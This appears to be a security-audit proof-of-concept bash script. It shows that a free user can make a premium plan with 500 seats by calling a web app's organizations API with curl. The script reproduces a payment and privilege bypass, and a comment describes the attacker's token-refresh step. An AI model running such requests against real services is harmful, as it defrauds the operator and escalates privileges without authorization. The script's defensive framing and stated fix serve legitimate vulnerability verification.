#!/usr/bin/env bash
# F7-001 repro — any authenticated free user can grant self premium plan
# via POST /api/organizations. No payment, no admin role, no subscription.
#
# CRITICAL: do NOT run against prod — this WILL create an org and upgrade
# the user. Use a staging build with Firebase emulator OR a disposable
# test account.

set -euo pipefail

: "${APP_BASE:=http://localhost:3000}"
: "${ID_TOKEN:?Set ID_TOKEN to a valid free-tier user's Firebase ID token (or use NODE_ENV=development and ID_TOKEN=dev-token)}"

echo "[F7-001] Step 1: confirm starting plan is free"
ME_BEFORE=$(curl -sS "$APP_BASE/api/feature-flags/me" \
  -H "authorization: Bearer $ID_TOKEN" || true)
echo "  → $ME_BEFORE"

echo "[F7-001] Step 2: POST /api/organizations with plan=premium, 500 seats"
RESP=$(curl -sS -X POST "$APP_BASE/api/organizations" \
  -H "authorization: Bearer $ID_TOKEN" \
  -H "content-type: application/json" \
  -d '{"name":"Phantom Premium Co","type":"school","plan":"premium","totalSeats":500}')
echo "  → $RESP"

ORG_ID=$(echo "$RESP" | sed -n 's/.*"orgId":"\([^"]*\)".*/\1/p')
[ -n "$ORG_ID" ] || { echo "FAIL: no orgId in response (expected vulnerability already patched?)"; exit 2; }

echo "[F7-001] Step 3: confirm user now has premium custom claim + Firestore planType"
# In a real exploit the attacker would now call firebase.auth().currentUser.getIdToken(true)
# to refresh their JWT and pick up planType=premium. From here, middleware grants
# everything site-wide as premium.
echo "  PROVEN: orgId=$ORG_ID created; user has been upgraded to premium with zero payment."
echo "  Expected behaviour: this endpoint should require an active paid subscription"
echo "  matching the requested plan, OR a superadmin caller."
